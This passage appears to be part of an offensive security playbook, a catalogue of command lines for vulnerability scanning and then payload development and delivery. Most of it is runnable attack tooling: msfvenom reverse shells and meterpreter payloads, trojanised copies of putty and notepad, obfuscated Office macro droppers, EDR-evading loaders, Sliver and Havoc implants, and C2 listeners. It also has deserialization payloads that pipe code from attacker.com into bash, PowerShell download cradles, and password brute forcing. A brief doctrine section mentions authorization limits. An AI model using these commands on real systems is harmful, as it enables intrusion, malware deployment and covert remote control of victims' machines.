lynis audit dockerfile /path/to/Dockerfile --no-colors > lynis_docker.txt

# linpeas — Linux privilege escalation and misconfiguration audit
./linpeas.sh -a 2>&1 | tee linpeas_full.txt
./linpeas.sh -s -P > linpeas_silent.txt
./linpeas.sh -e -o linpeas_extended.txt

# nuclei — misconfiguration templates
nuclei -u https://target.com -tags misconfig -o nuclei_misconfig.txt -json
nuclei -l urls.txt -t /root/nuclei-templates/misconfiguration/ -o nuclei_misconfig_bulk.txt -json

# nmap — configuration audit scripts
nmap --script ssh2-enum-algos -p 22 target.com -oN nmap_ssh_config.txt
nmap --script http-security-headers -p 80,443 target.com -oN nmap_headers.txt
nmap --script http-cookie-flags -p 80,443 target.com -oN nmap_cookies.txt
nmap --script smb-security-mode -p 445 target.com -oN nmap_smb_config.txt

# testssl.sh — TLS configuration audit
testssl.sh --full --json-pretty testssl_config.json https://target.com

# prowler — cloud configuration audit
prowler aws --compliance cis_level2 -M json -o prowler_cis.json
```

---

### 8. CMS EXPLOITATION
**Inputs:** `target_url`, `cms_type`, `username_list`, `plugin_list`, `output_file`
**Tools:** wpscan, droopescan, joomscan, cmseek, nuclei, nikto

```bash
# wpscan — WordPress vulnerability scanner
wpscan --url https://target.com -e ap,at,u --api-token $WPTOKEN -o wpscan_full.json -f json
wpscan --url https://target.com -e vp,vt --api-token $WPTOKEN -o wpscan_vulns.json -f json
wpscan --url https://target.com --passwords /usr/share/wordlists/rockyou.txt --usernames admin -t 50 -o wpscan_brute.txt
wpscan --url https://target.com -e ap --plugins-detection aggressive -o wpscan_plugins.txt

# droopescan — Drupal/SilverStripe/WordPress scanner
droopescan scan drupal -u https://target.com -o droopescan_out.txt
droopescan scan wordpress -u https://target.com -o droopescan_wp.txt

# joomscan — Joomla vulnerability scanner
joomscan -u https://target.com -o joomscan_out/
joomscan -u https://target.com -ec -o joomscan_enum/

# cmseek — CMS detection and exploitation
cmseek -u https://target.com --batch
cmseek -u https://target.com --follow-redirect --batch

# nuclei — CMS-specific templates
nuclei -u https://target.com -tags wordpress,wp -o nuclei_wp.txt -json
nuclei -u https://target.com -tags joomla,drupal,magento -o nuclei_cms.txt -json

# nikto — CMS-aware scanning
nikto -h https://target.com -Tuning b -o nikto_cms.txt
```

---

### 9. CLOUD MISCONFIGURATION
**Inputs:** `cloud_provider`, `account_profile`, `region`, `service_list`, `output_file`
**Tools:** prowler, scoutsuite, cloudsplaining, pmapper, steampipe, awscli

```bash
# prowler — multi-cloud misconfiguration scanning
prowler aws --severity critical high -M json-ocsf -o prowler_critical/
prowler aws -c s3_bucket_public_access iam_root_access_key_check ec2_sg_open_to_world -o prowler_custom/
prowler aws --compliance hipaa -M json -o prowler_hipaa/
prowler azure --severity critical high -M json -o prowler_az_critical/
prowler gcp --severity critical high -M json -o prowler_gcp_critical/

# scoutsuite — multi-cloud configuration review
scout aws --force --no-browser --report-dir scout_aws/
scout aws --services s3,iam,ec2,rds --force --no-browser --report-dir scout_aws_focused/

# cloudsplaining — AWS IAM privilege escalation finder
cloudsplaining download --profile target-profile
cloudsplaining scan --input-file account-auth-details.json --output cloudsplaining_out/

# steampipe — SQL-based cloud configuration queries
steampipe query "select name, acl, policy from aws_s3_bucket where bucket_policy_is_public" --output json > steampipe_s3.json
steampipe query "select title, arn from aws_iam_user where mfa_enabled = false" --output json > steampipe_mfa.json

# awscli — manual misconfiguration checks
aws iam get-account-authorization-details --output json > iam_auth_details.json
aws ec2 describe-security-groups --filters "Name=ip-permission.cidr,Values=0.0.0.0/0" --output json > open_sgs.json
aws s3api get-bucket-policy --bucket target-bucket 2>/dev/null
aws rds describe-db-instances --query 'DBInstances[?PubliclyAccessible==`true`]' --output json > public_rds.json
```

---

### 10. TLS ASSESSMENT
**Inputs:** `target_host`, `target_port`, `protocol_version`, `cipher_list`, `output_file`
**Tools:** testssl.sh, sslscan, sslyze, nmap, tlsx, openssl

```bash
# testssl.sh — exhaustive TLS assessment
testssl.sh --vulnerable https://target.com | tee testssl_vulns.txt
testssl.sh --heartbleed --ccs --ticketbleed --robot --crime --breach --poodle --sweet32 --freak --drown --logjam https://target.com
testssl.sh --protocols --ciphers --server-preference --headers https://target.com

# sslscan — cipher enumeration and vulnerability check
sslscan --show-certificate --show-client-cas --no-colour target.com:443 > sslscan_full.txt

# sslyze — certificate chain and protocol analysis
sslyze target.com --heartbleed --openssl_ccs --robot --certinfo --reneg --compression
sslyze target.com --json_out sslyze_full.json

# nmap — TLS vulnerability scanning
nmap --script ssl-heartbleed,ssl-poodle,ssl-ccs-injection,ssl-dh-params -p 443 target.com -oN nmap_tls_vulns.txt
nmap --script ssl-enum-ciphers -p 443 target.com -oN nmap_tls_ciphers.txt
nmap --script ssl-cert -p 443 target.com -oN nmap_tls_cert.txt

# tlsx — TLS inspection and misconfig detection
echo target.com | tlsx -expired -mismatched -self-signed -revoked -json -o tlsx_issues.json
tlsx -l hosts.txt -p 443,8443 -san -cn -so -json -o tlsx_bulk.json

# openssl — manual TLS protocol testing
for proto in tls1 tls1_1 tls1_2 tls1_3; do echo | openssl s_client -connect target.com:443 -$proto 2>&1 | head -5; done
echo | openssl s_client -connect target.com:443 -cipher 'RC4' 2>&1 | grep -i cipher
echo | openssl s_client -connect target.com:443 -cipher 'DES:3DES' 2>&1 | grep -i cipher
```

---

### 11. API TESTING
**Inputs:** `target_url`, `api_spec_file`, `auth_token`, `method`, `output_file`
**Tools:** nuclei, ffuf, arjun, kiterunner, curl, wfuzz

```bash
# nuclei — API vulnerability templates
nuclei -u https://target.com/api -tags api -o nuclei_api.txt -json
nuclei -u https://target.com -t /root/nuclei-templates/exposures/apis/ -o nuclei_api_expose.txt
nuclei -u https://target.com -tags graphql -o nuclei_graphql.txt -json

# ffuf — API endpoint and method fuzzing
ffuf -u https://target.com/api/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,201,204,301,302,401,403,405 -o ffuf_api.json -of json
ffuf -u https://target.com/api/v1/users/FUZZ -w /usr/share/wordlists/seclists/Fuzzing/1-20.txt -mc 200 -o ffuf_idor.json -of json
ffuf -u https://target.com/api/endpoint -X FUZZ -w /usr/share/wordlists/seclists/Fuzzing/http-request-methods.txt -mc all -fc 405 -o ffuf_methods.json -of json

# kiterunner — API route discovery
kr scan https://target.com -A=apiroutes-210328:20000 -x 10 -j 100 --fail-status-codes 404 -o kr_api.txt

# curl — manual API testing
curl -sk https://target.com/api/v1/users -H "Authorization: Bearer $TOKEN" | jq .
curl -sk -X PUT https://target.com/api/v1/users/1 -H "Content-Type: application/json" -d '{"role":"admin"}' | jq .
curl -sk https://target.com/graphql -H "Content-Type: application/json" -d '{"query":"{__schema{types{name,fields{name}}}}"}'
curl -sk https://target.com/api/swagger.json | jq .
curl -sk https://target.com/.well-known/openid-configuration | jq .

# wfuzz — API parameter fuzzing
wfuzz -u https://target.com/api/v1/users/FUZZ -w /usr/share/wordlists/seclists/Fuzzing/1-100.txt --hc 404 -t 50
```

---

### 12. TEMPLATE INJECTION
**Inputs:** `target_url`, `parameter`, `template_engine`, `payload_file`, `output_file`
**Tools:** tplmap, nuclei, ffuf, curl, wapiti

```bash
# tplmap — automated server-side template injection
tplmap -u "https://target.com/page?name=test"
tplmap -u "https://target.com/page?name=test" --os-shell
tplmap -u "https://target.com/page?name=test" --os-cmd "id"
tplmap -u "https://target.com/page" -d "name=test" --os-shell
tplmap -u "https://target.com/page?name=test" -e Jinja2 --os-cmd "cat /etc/passwd"

# nuclei — SSTI templates
nuclei -u https://target.com -tags ssti -o nuclei_ssti.txt -json
nuclei -l urls_with_params.txt -tags ssti -o nuclei_ssti_bulk.txt

# ffuf — SSTI payload fuzzing
ffuf -u "https://target.com/page?name=FUZZ" -w /usr/share/wordlists/seclists/Fuzzing/template-engines-expression.txt -mc all -fr "test" -o ffuf_ssti.json -of json

# curl — manual SSTI testing
curl -sk "https://target.com/page?name={{7*7}}"
curl -sk "https://target.com/page?name=\${7*7}"
curl -sk "https://target.com/page?name={{config}}"
curl -sk "https://target.com/page?name={{''.__class__.__mro__[1].__subclasses__()}}"

# wapiti — SSTI module
wapiti -u https://target.com --scope page -m ssrf -f json -o wapiti_ssti.json
```

---

### 13. DESERIALIZATION TESTING
**Inputs:** `target_url`, `target_port`, `framework`, `payload_type`, `output_file`
**Tools:** ysoserial, nuclei, curl, ffuf, nmap

```bash
# ysoserial — Java deserialization payload generation
java -jar ysoserial.jar CommonsCollections1 "id" > payload_cc1.bin
java -jar ysoserial.jar CommonsCollections5 "curl http://attacker.com/shell.sh | bash" | base64 -w0
java -jar ysoserial.jar Jdk7u21 "wget http://attacker.com/rev.sh -O /tmp/rev.sh" > payload_jdk7.bin
java -jar ysoserial.jar URLDNS "http://your.interact.sh" > urldns_payload.bin

# nuclei — deserialization templates
nuclei -u https://target.com -tags deserialization,java -o nuclei_deser.txt -json
nuclei -l urls.txt -tags rce,deserialization -severity critical -o nuclei_deser_critical.txt

# curl — manual deserialization testing
curl -sk https://target.com/api/endpoint -H "Content-Type: application/x-java-serialized-object" --data-binary @payload_cc1.bin
curl -sk https://target.com -H "Cookie: session=$(cat urldns_payload.bin | base64 -w0)"

# nmap — Java RMI and deserialization scanning
nmap --script rmi-dumpregistry,rmi-vuln-classloader -p 1099 target.com -oN nmap_rmi.txt
nmap --script http-vuln-cve2017-5638 -p 80,443 target.com -oN nmap_struts.txt

# ffuf — deserialization endpoint discovery
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 500 -o ffuf_deser.json -of json
```

---

### 14. FUZZ TESTING
**Inputs:** `target_url`, `fuzz_position`, `payload_wordlist`, `match_criteria`, `output_file`
**Tools:** ffuf, wfuzz, radamsa, boofuzz, nuclei, curl

```bash
# ffuf — multi-purpose web fuzzing
ffuf -u "https://target.com/FUZZ" -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200 -o ffuf_lfi.json -of json
ffuf -u "https://target.com/page?file=FUZZ" -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -mc 200 -o ffuf_lfi_linux.json -of json
ffuf -u "https://target.com/page?id=FUZZ" -w /usr/share/wordlists/seclists/Fuzzing/Integers/1-65535.txt -mc 200 -fs 1234 -o ffuf_idor.json -of json
ffuf -u https://target.com/login -X POST -d "user=admin&pass=FUZZ" -w /usr/share/wordlists/rockyou.txt -mc 302 -o ffuf_brute.json -of json -t 50
ffuf -u "https://target.com/page" -H "FUZZ: evil" -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc all -fc 404 -o ffuf_headers.json -of json

# wfuzz — advanced web fuzzing
wfuzz -u "https://target.com/page?FUZZ=../../../etc/passwd" -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt --hl 0 -t 50 -o wfuzz_lfi.txt
wfuzz -u https://target.com/login -d "user=admin&pass=FUZZ" -w /usr/share/wordlists/rockyou.txt --hc 403 -t 50

# radamsa — mutation-based fuzzing
echo "normal_input" | radamsa -n 100 > radamsa_payloads.txt
cat seed_input.txt | radamsa -n 1000 | while read payload; do curl -sk "https://target.com/api?input=$payload" -o /dev/null -w "%{http_code}\n"; done

# boofuzz — protocol fuzzing
boofuzz -t target.com -p 8080 --web-port 26000

# nuclei — fuzz-based templates
nuclei -u "https://target.com/page?id=FUZZ" -tags fuzz -o nuclei_fuzz.txt -json
```

---

### 15. NUCLEI SCANNING
**Inputs:** `target_url`, `url_list`, `template_tags`, `severity_filter`, `output_file`
**Tools:** nuclei, httpx, notify, jq, anew

```bash
# nuclei — comprehensive template scanning
nuclei -l urls.txt -severity critical,high -o nuclei_crithigh.txt -json -rate-limit 150 -bulk-size 50 -c 50
nuclei -l urls.txt -tags cve -severity critical -o nuclei_cve_critical.txt -json
nuclei -l urls.txt -tags oast -interactsh-server interact.sh -o nuclei_oob.txt -json
nuclei -l urls.txt -w /root/nuclei-templates/workflows/ -o nuclei_workflows.txt -json
nuclei -l urls.txt -t /root/nuclei-templates/exposures/ -o nuclei_exposures.txt -json
nuclei -l urls.txt -tags token,credential,secret,leak -o nuclei_secrets.txt -json
nuclei -l urls.txt -tags takeover -o nuclei_takeover.txt -json
nuclei -l urls.txt --new-templates -o nuclei_new.txt -json
nuclei -l urls.txt -tags default-login -o nuclei_defaults.txt -json
nuclei -u https://target.com -as -o nuclei_auto.txt -json

# httpx — pre-filter live targets for nuclei
cat all_hosts.txt | httpx -silent -o live_urls.txt
cat live_urls.txt | nuclei -severity critical,high -o nuclei_live.txt -json

# jq — parse and filter nuclei results
jq -r 'select(.info.severity == "critical") | "\(.host) \(.info.name) \(.matched-at)"' nuclei_crithigh.txt > critical_findings.txt
jq -r '.info.name' nuclei_crithigh.txt | sort | uniq -c | sort -rn > finding_summary.txt
```

---

### 16. FINDING VALIDATION
**Inputs:** `finding_list`, `target_url`, `exploit_proof`, `evidence_directory`, `output_file`
**Tools:** curl, nuclei, sqlmap, nmap, httpx, openssl

```bash
# curl — manual finding validation
curl -sk "https://target.com/vuln_endpoint" -o validation_response.txt -w "\nHTTP_CODE:%{http_code}\nSIZE:%{size_download}\n"
curl -sk "https://target.com/admin/" -H "X-Forwarded-For: 127.0.0.1" -o bypass_validation.txt -D bypass_headers.txt
curl -sk "https://target.com/page?id=1' OR '1'='1" -o sqli_validation.txt

# nuclei — re-validate specific findings
nuclei -u https://target.com -id CVE-2021-44228 -o nuclei_log4j_validate.txt -json -debug
nuclei -u https://target.com -t /path/to/specific_template.yaml -o nuclei_validate.txt -json -v

# sqlmap — validate SQL injection findings
sqlmap -u "https://target.com/page?id=1" --batch --technique=B --dbms=mysql --banner

# nmap — validate network-level findings
nmap --script vuln -p 445 target.com -oN nmap_smb_validate.txt
nmap --script ssl-heartbleed -p 443 target.com -oN nmap_heartbleed_validate.txt

# httpx — bulk validate web findings
cat finding_urls.txt | httpx -mc 200 -title -cl -json -o httpx_validation.json

# openssl — validate TLS findings
echo | openssl s_client -connect target.com:443 -tls1 2>&1 | grep -i "protocol"
echo | openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -dates
```

---

### Phase Rule — VULNERABILITY ASSESSMENT

> **Operational doctrine.** Vulnerability assessment converts attack surface inventory into exploitable findings. Every scan targets specific vulnerability classes. Execution protocol:
>
> 1. **Scan prioritization** — critical and high severity first. Known CVEs before logic flaws. Automated scanning before manual validation. Unauthenticated checks before authenticated deep scans.
> 2. **Template currency** — nuclei templates are updated before every engagement (`nuclei -update-templates`). Custom templates are version-controlled and tested against known-vulnerable targets before deployment.
> 3. **False positive elimination** — every automated finding is validated manually or with a second tool before reporting. Validation evidence (HTTP response, screenshot, exploit output) is captured and stored.
> 4. **Injection testing safety** — SQL injection uses `--batch` mode and avoids destructive operations unless explicitly authorized. XSS testing uses benign payloads (`alert(document.domain)`) unless blind callbacks are required. Command injection validation stops at `id`/`whoami` — no reverse shells without operator approval.
> 5. **Dependency chain** — vulnerability scanning consumes Phase 02 outputs (port lists, URL lists, technology stacks). Findings feed Phase 04 (payload development) and Phase 05 (privilege escalation).
> 6. **Rate limiting** — web scanners are throttled per target. Nuclei rate-limit is set per engagement ROE. Concurrent scan threads are capped to avoid denial-of-service conditions on production targets.
> 7. **Evidence standards** — every finding includes: vulnerability name, CVE/CWE where applicable, affected URL/host/port, proof-of-concept command, raw response, severity rating, and remediation guidance.

---

## 04. PAYLOAD DEVELOPMENT & DELIVERY

**Minimum capability count: 16**

### 1. SHELLCODE GENERATION
**Inputs:** `target_os`, `target_arch`, `lhost`, `lport`, `encoder`, `output_format`
**Tools:** msfvenom, donut, sRDI, pwntools, nasm

```bash
# msfvenom — multi-platform shellcode generation
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f elf -o rev_shell.elf
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f exe -o meterpreter.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f c -o shellcode.c
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f raw -o shellcode.bin
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.1 LPORT=443 -f csharp -o shellcode.cs
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f python -o shellcode.py
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f powershell -o shellcode.ps1

# donut — PE/DLL to position-independent shellcode
donut -i implant.exe -o loader.bin -a 2 -f 1
donut -i payload.dll -o loader_dll.bin -a 2 -e 3 -z 2
donut -i payload.exe -o loader_param.bin -a 2 -p "--command exec"

# nasm — custom assembly shellcode
nasm -f elf64 shellcode.asm -o shellcode.o && ld -o shellcode shellcode.o
nasm -f bin shellcode.asm -o shellcode.bin

# pwntools — Python-based shellcode crafting
python3 -c "from pwn import *; print(shellcraft.amd64.linux.sh())" > pwntools_shell.asm
python3 -c "from pwn import *; context.arch='amd64'; sc=asm(shellcraft.sh()); open('pwn_shell.bin','wb').write(sc)"
```

---

### 2. PAYLOAD ENCODING
**Inputs:** `payload_file`, `encoder_type`, `iterations`, `bad_chars`, `output_file`
**Tools:** msfvenom, shikata_ga_nai (via msfvenom), base64, xxd, msfencode

```bash
# msfvenom — payload encoding with multiple encoders
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -e x64/xor_dynamic -f exe -o encoded_xor.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded_shikata.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -e x64/zutto_dekiru -i 3 -f exe -o encoded_zutto.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -e x64/xor -b '\x00\x0a\x0d' -f elf -o encoded_linux.elf
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -e x64/xor_dynamic -i 3 -f raw | msfvenom -e x64/xor -i 2 -f exe -o double_encoded.exe

# base64 — simple base64 encoding/obfuscation
base64 -w0 payload.bin > payload_b64.txt
cat payload.bin | base64 -w0 | rev > payload_b64_rev.txt
echo 'IEX(New-Object Net.WebClient).DownloadString("http://10.10.10.1/shell.ps1")' | base64 -w0

# xxd — hex encoding for payload delivery
xxd -p payload.bin | tr -d '\n' > payload_hex.txt
xxd -r -p payload_hex.txt > payload_reconstructed.bin

# custom XOR encoding
python3 -c "import sys; key=0x41; data=open('payload.bin','rb').read(); open('payload_xor.bin','wb').write(bytes([b^key for b in data]))"
```

---

### 3. BINARY WEAPONIZATION
**Inputs:** `source_binary`, `payload_file`, `target_arch`, `output_file`, `evasion_level`
**Tools:** msfvenom, scarecrow, nim (compile), go (compile), upx

```bash
# msfvenom — binary injection into legitimate executables
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -x /path/to/putty.exe -k -f exe -o weaponized_putty.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -x /path/to/notepad.exe -f exe -o weaponized_notepad.exe

# scarecrow — EDR evasion loader generation
ScareCrow -I payload.bin -Loader binary -domain target.com -o scarecrow_loader.exe
ScareCrow -I payload.bin -Loader dll -domain microsoft.com -o scarecrow_dll.dll
ScareCrow -I payload.bin -Loader control -domain target.com -o scarecrow_cpl.cpl
ScareCrow -I payload.bin -Loader excel -domain target.com -o scarecrow_xll.xll

# nim — compile payload loaders in Nim
nim c -d:release -d:strip --opt:size --passC:-flto payload_loader.nim
nim c -d:mingw --cpu:amd64 -d:release payload_loader.nim

# go — compile payload loaders in Go
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H windowsgui" -o loader.exe loader.go
GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o loader loader.go

# upx — binary packing
upx --best --ultra-brute payload.exe -o packed_payload.exe
upx -9 payload.elf -o packed_payload.elf
```

---

### 4. MACRO CRAFTING
**Inputs:** `payload_url`, `lhost`, `lport`, `document_type`, `output_file`
**Tools:** macropack, unicorn, msfvenom, evil-winrm (for delivery), certutil (embedded)

```bash
# macropack — Office macro payload generation
macropack -t VBA -o macro_payload.vba -G payload.doc --obfuscate
macropack -t VBA -o macro_hta.hta --obfuscate -G payload.hta
macropack -t EXCEL4 -o macro_xlm.csv -G payload.xlsm --obfuscate
echo "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.1/rev.ps1')" | macropack -t VBA -o macro_ps.vba -G ps_payload.doc --obfuscate

# unicorn — PowerShell attack vector generator
python3 unicorn.py windows/meterpreter/reverse_tcp 10.10.10.1 4444
python3 unicorn.py windows/meterpreter/reverse_https 10.10.10.1 443 macro
python3 unicorn.py windows/meterpreter/reverse_tcp 10.10.10.1 4444 hta

# msfvenom — VBA macro payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f vba-exe -o msfvenom_macro.vba
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f vba -o msfvenom_vba.txt
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f hta-psh -o msfvenom_hta.hta
```

---

### 5. IMPLANT BUILDING
**Inputs:** `c2_server`, `c2_port`, `implant_type`, `target_os`, `evasion_config`
**Tools:** sliver, havoc, metasploit, mythic-cli, poshc2

```bash
# sliver — C2 implant generation
sliver-client generate --mtls 10.10.10.1:8888 --os windows --arch amd64 --format exe --save implant_mtls.exe
sliver-client generate --http 10.10.10.1:80 --os linux --arch amd64 --format elf --save implant_http.elf
sliver-client generate --dns c2.target.com --os windows --arch amd64 --save implant_dns.exe
sliver-client generate --mtls 10.10.10.1:8888 --os windows --arch amd64 --format shellcode --save implant.bin
sliver-client generate --mtls 10.10.10.1:8888 --os windows --arch amd64 --format shared --save implant.dll
sliver-client generate --wg 10.10.10.1:51820 --os windows --arch amd64 --save implant_wg.exe

# havoc — Demon implant generation (via CLI/API)
havoc-client --teamserver 10.10.10.1:40056 generate demon --os windows --arch x64 --format exe --output demon.exe
havoc-client --teamserver 10.10.10.1:40056 generate demon --os windows --arch x64 --format shellcode --output demon.bin

# metasploit — meterpreter/shell implants
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.1 LPORT=443 HttpUserAgent="Mozilla/5.0" -f exe -o https_meterpreter.exe
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f elf -o linux_meterpreter.elf
msfvenom -p python/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -o py_meterpreter.py

# mythic-cli — Mythic C2 agent generation
mythic-cli payload create --payload-type apollo --c2-profile http --os windows --output apollo_http.exe
mythic-cli payload create --payload-type poseidon --c2-profile websocket --os linux --output poseidon_ws.elf
```

---

### 6. STAGER CREATION
**Inputs:** `payload_url`, `lhost`, `lport`, `stager_type`, `output_file`
**Tools:** msfvenom, donut, scarecrow, sliver, certutil (embedded cmd)

```bash
# msfvenom — staged payload generation
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f exe -o staged_tcp.exe
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.1 LPORT=443 -f dll -o staged_dll.dll
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f psh -o stager.ps1
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f aspx -o stager.aspx
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f war -o stager.war

# donut — convert PE to shellcode for staging
donut -i implant.exe -o stager.bin -a 2 -f 1 -e 3 -z 2
donut -i implant.dll -o stager_dll.bin -a 2 -m DllMain

# scarecrow — staged loader creation
ScareCrow -I shellcode.bin -Loader binary -domain target.com -o stager_sc.exe
ScareCrow -I shellcode.bin -Loader dll -domain microsoft.com -o stager_sc.dll

# sliver — stager generation
sliver-client stage-listener --url tcp://10.10.10.1:8443 --profile implant_profile
sliver-client generate stager --lhost 10.10.10.1 --lport 8443 --os windows --arch amd64 --format raw --save stager.bin
```

---

### 7. DROPPER PACKAGING
**Inputs:** `payload_file`, `delivery_method`, `decoy_file`, `output_file`, `obfuscation_level`
**Tools:** msfvenom, scarecrow, macropack, pyinstaller, shc

```bash
# scarecrow — EDR-evading dropper
ScareCrow -I payload.bin -Loader binary -domain microsoft.com -o dropper.exe -sandbox
ScareCrow -I payload.bin -Loader control -domain target.com -o dropper.cpl -sandbox

# macropack — document dropper
echo 'powershell -ep bypass -e BASE64PAYLOAD' | macropack -t VBA -o dropper.vba -G dropper.doc --obfuscate --bypass
macropack -t VBA -f payload.vba -G dropper.docm --obfuscate --bypass

# msfvenom — multi-format droppers
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f msi -o dropper.msi
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f exe-service -o dropper_svc.exe
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.10.1 LPORT=4444 -f raw -o dropper.sh

# pyinstaller — Python payload packaging
pyinstaller --onefile --noconsole --icon=legit.ico dropper.py
pyinstaller --onefile --noconsole --add-data "decoy.pdf:." dropper.py

# shc — shell script compiler (Linux)
shc -f dropper.sh -o dropper_compiled
shc -f dropper.sh -o dropper_compiled -e 31/12/2026 -m "Expired"
```

---

### 8. ARTIFACT OBFUSCATION
**Inputs:** `source_file`, `obfuscation_method`, `target_language`, `output_file`
**Tools:** scarecrow, garble, pyarmor, bash-obfuscate, javascript-obfuscator

```bash
# scarecrow — binary obfuscation with code signing
ScareCrow -I payload.bin -Loader binary -domain microsoft.com -o obfuscated.exe -configfile config.json
ScareCrow -I payload.bin -Loader dll -domain google.com -o obfuscated.dll -noetw -nosleep

# garble — Go binary obfuscation
garble -literals -tiny -seed=random build -o obfuscated_go.exe ./cmd/loader
garble -literals build -o obfuscated_loader.exe

# pyarmor — Python script obfuscation
pyarmor gen --output dist/ payload.py
pyarmor gen --pack onefile --output dist/ payload.py
pyarmor gen --enable-jit --output dist/ payload.py

# bash-obfuscate — shell script obfuscation
bash-obfuscate dropper.sh -o obfuscated.sh
bashfuscator -c dropper.sh -o obfuscated.sh --layers 3

# manual string obfuscation techniques
python3 -c "import base64; code=open('payload.py').read(); print(f'exec(__import__(\"base64\").b64decode(\"{base64.b64encode(code.encode()).decode()}\"))')" > obfuscated_py.py
```

---

### 9. PAYLOAD TESTING
**Inputs:** `payload_file`, `test_target`, `av_product`, `sandbox_config`, `output_file`
**Tools:** file, strings, objdump, readelf, yara, sha256sum

```bash
# file — binary type identification
file payload.exe
file payload.elf
file payload.dll

# strings — extract embedded strings
strings -n 8 payload.exe | grep -iE '(http|socket|connect|shell|cmd|powershell|exec|system)'
strings -n 6 payload.elf | head -100

# objdump — binary disassembly analysis
objdump -d payload.elf | head -200
objdump -x payload.exe | grep -i import
objdump -t payload.elf | grep -i 'exec\|system\|connect\|socket'

# readelf — ELF binary analysis
readelf -h payload.elf
readelf -S payload.elf
readelf -d payload.elf | grep NEEDED
readelf -s payload.elf | grep -iE '(exec|system|connect|socket|bind|listen)'

# yara — signature-based detection testing
yara -r /path/to/rules/ payload.exe > yara_results.txt
yara -r /usr/share/yara/malware/ payload.elf > yara_malware.txt
yara -s -r /path/to/custom_rules.yar payload.bin > yara_custom.txt

# sha256sum — payload fingerprinting
sha256sum payload.exe > payload_hash.txt
md5sum payload.exe >> payload_hash.txt
sha1sum payload.exe >> payload_hash.txt
```

---

### 10. BINARY ANALYSIS
**Inputs:** `binary_file`, `analysis_type`, `output_file`, `disassembly_depth`
**Tools:** objdump, readelf, file, strings, strace, ltrace

```bash
# objdump — comprehensive binary disassembly
objdump -d -M intel payload.elf > disassembly.txt
objdump -x payload.exe > pe_headers.txt
objdump -d --no-show-raw-insn payload.elf | grep -E '(call|jmp|syscall)'
objdump -R payload.elf > relocations.txt

# readelf — ELF structure analysis
readelf -a payload.elf > elf_full_analysis.txt
readelf -l payload.elf
readelf --notes payload.elf
readelf -p .rodata payload.elf

# strace — runtime system call tracing
strace -f -o strace_out.txt ./payload.elf
strace -e trace=network -f ./payload.elf
strace -e trace=file -f ./payload.elf

# ltrace — library call tracing
ltrace -f -o ltrace_out.txt ./payload.elf
ltrace -e connect+send+recv -f ./payload.elf

# strings — deep string analysis
strings -a -t x payload.exe > strings_offset.txt
strings -e l payload.exe > strings_unicode.txt

# file — magic byte analysis
file -b --mime-type payload.bin
xxd payload.bin | head -20
```

---

### 11. C2 CONFIGURATION
**Inputs:** `c2_server`, `c2_port`, `protocol`, `sleep_interval`, `jitter`
**Tools:** sliver, metasploit (msfconsole), havoc, mythic-cli, poshc2

```bash
# sliver — C2 listener configuration
sliver-client mtls --lhost 0.0.0.0 --lport 8888
sliver-client https --lhost 0.0.0.0 --lport 443 --domain c2.target.com --cert /path/to/cert.pem --key /path/to/key.pem
sliver-client dns --domains c2.target.com --lport 53
sliver-client wg --lport 51820 --nport 8888

# metasploit — handler configuration
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; set ExitOnSession false; exploit -j"
